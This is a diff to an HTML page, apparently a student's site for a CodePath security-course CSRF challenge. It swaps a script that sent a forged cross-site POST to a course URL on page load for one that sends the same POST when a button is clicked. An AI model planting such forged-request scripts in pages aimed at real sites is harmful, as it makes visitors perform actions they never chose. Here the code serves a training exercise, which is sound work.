@@ -19,18 +19,31 @@
 
     gtag('config', 'G-DB6DYCD27P');
   </script>
-  <script>
+  <!-- <script>
     console.log("Detected")
     function codePathXss() {
       var xhr = new XMLHttpRequest();
       var url =
         "https://security.codepath.com/user/csrfchallengtwo/plusplus?userid=9464f59d6612758dfdf3985b3f79f9efb804ea10"
       xhr.open("POST", url, true);
-      xhr.setRequestHeader('Access-Control-Allow-Origin', 'https://security.codepath.com/');
+      xhr.setRequestHeader('Content-Type', 'application/json');
       xhr.send();
       console.log("Hello World")
     }
     window.onload = codePathXss;
+  </script> -->
+  <script>
+    window.addEventListener("load", function () {
+      document.getElementById("codepath").addEventListener("click", function (e) {
+        var xhr = new XMLHttpRequest();
+        var url =
+          "https://security.codepath.com/user/csrfchallengtwo/plusplus?userid=9464f59d6612758dfdf3985b3f79f9efb804ea10"
+        xhr.open("POST", url, true);
+        xhr.setRequestHeader('Access-Control-Allow-Origin', 'https://security.codepath.com/');
+        xhr.send();
+        console.log("Hello World")
+      });
+    });
   </script>
 </head>
 
@@ -88,7 +101,8 @@
       <div id="intro-button-wrapper">
         <!-- <a href="#about-me" class="btn btn-medium btn-dark btn-lg text-uppercase" id="intro-button">Let's take a
           tour.</a> -->
-        <a class="btn btn-medium btn-dark btn-lg" id="codepath">CodePath here :D</a>
+        <a class="btn btn-medium btn-dark btn-lg text-uppercase" id="codepath">CodePath
+          Assigment here :D</a>
       </div>
       </div>
     </section>
